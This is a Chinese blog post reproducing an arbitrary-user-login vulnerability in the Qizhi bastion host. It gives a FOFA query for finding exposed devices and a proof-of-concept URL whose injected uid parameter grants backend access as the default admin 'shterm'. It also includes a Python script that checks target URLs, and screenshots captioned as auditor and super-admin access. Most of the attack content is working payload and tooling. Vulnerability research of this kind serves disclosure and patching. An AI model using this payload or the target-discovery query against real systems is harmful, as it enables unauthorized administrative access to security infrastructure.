---
title: 齐治堡垒机任意用户登录
tags:
  - 漏洞复现
categories:
  - 漏洞复现
copyright: true
abbrlink: f8593b1e
date: 2021-07-12 21:33:54
---

![](https://z3.ax1x.com/2021/07/13/WFHmrV.jpg)

<!--more-->

### 齐治堡垒机存在任意用户登录漏洞

   齐治堡垒机存在任意用户登录漏洞，访问特定的URL即可获得后台权限

### 验证

fofa  `app="齐治科技-堡垒机"`

POC

```sqlite
http://xxx.xxx.xxx.xxx/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm
```

`shterm` 为缺省管理员账户。

审计员：

![img](https://z3.ax1x.com/2021/07/13/WF7zKP.png)



切换超管角色：

![img](https://z3.ax1x.com/2021/07/13/WFHpb8.png)

PY脚本

```python
import requests,sys,re,urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# for url in  open("C:/1.txt","r"):
if len(sys.argv)<2:
        print("[+]Use: pyhton3 齐治科技-堡垒机.py http://ip:port")
        print("[+]Explain: HADESI")
        print("[+]============================")
        sys.exit()

url=sys.argv[1]
url1=url+"/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm"

res = requests.get(url=url1,verify=False)
# print (res.status_code)
if res.status_code == 200 :
    print(url1+">>>>>漏洞存在")
```

**Reference**

https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md